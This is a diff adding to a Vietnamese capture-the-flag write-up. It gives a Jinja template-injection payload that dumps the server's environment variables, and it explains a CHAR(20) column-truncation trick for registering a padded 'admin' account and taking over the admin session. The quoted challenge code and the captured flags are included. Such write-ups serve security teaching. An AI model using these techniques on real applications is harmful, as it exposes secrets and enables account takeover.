@@ -86,3 +86,75 @@ def add_note():
 ```
 
 Ở  đây nó lọc các kí tự `' , " , [ , ] , request , %` thành rỗng.
+
+payload: `{{ lipsum.__globals__.os.environ }}`
+
+flag: `flag{sst1_v1a_j1nj4_t3mpl4t3_3nv1r0nm3nt}`
+
+## Identity Breach 
+Flag được trả về khi login được tài khoản là admin
+
+Khởi tạo db của chall , sử dụng `char(20)` là dạng `fix-length` không flexible giống `varchar()`
+```sql
+USE intelDB;
+
+CREATE TABLE IF NOT EXISTS soldiers (
+    username CHAR(20),
+    password CHAR(20)
+);
+
+-- Admin với password bí mật
+INSERT INTO soldiers VALUES ('admin', 'not_that_easy ;)');
+
+```
+
+login.php
+```php
+    $conn = get_db();
+    $stmt = $conn->prepare("SELECT * FROM soldiers WHERE username = ? AND password = ?");
+    $stmt->bind_param("ss", $username, $password);
+    $stmt->execute();
+    $result = $stmt->get_result();
+    $user = $result->fetch_assoc();
+    $conn->close();
+
+    if ($user) {
+        $_SESSION["user"] = trim($user["username"]); 
+        header("Location: /account.php");
+        exit;
+    } else {
+        $error = "Sai username hoặc password.";
+    }
+```
+`trim($user["username"])`: cắt space 2 đầu vì dùng `char()` sẽ được thêm padding để đủ 20 kí tự
+
+register.php
+```php
+        $stmt = $conn->prepare("SELECT username FROM soldiers WHERE username = ?");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $result = $stmt->get_result();
+
+        if ($result->num_rows > 0) {
+            $error = "Username đã tồn tại.";
+        } else {
+           
+            $stmt = $conn->prepare("INSERT INTO soldiers (username, password) VALUES (?, ?)");
+            $stmt->bind_param("ss", $username, $password);
+            if ($stmt->execute()) {
+                $success = "Đăng ký thành công! Hãy đăng nhập.";
+            } else {
+                $error = "Đăng ký thất bại: " . $conn->error;
+            }
+        }
+```
+
+Ở đây nếu đăng kí với 1 user: `admin + 15 space + kí_tự_lạ` thì điều kiện `where` sẽ false và đăng kí thành công nhưng khi `inser into` thì lại chỉ lưu `admin + 15 space` vì db được thiết kế với `char(20)` nên khi login thì sẽ có session của admin. 
+
+Điều kiện khả thi: Mysql tắt chế độ `strict` nếu bật sẽ bị ném lõi `Data too long for column 'username'`
+
+![](image/2026-10-05-00-01-04.png)
+flag: `HACKFEST{ch4r_trunc4t10n_1s_d4ng3r0us}`
+
+
+
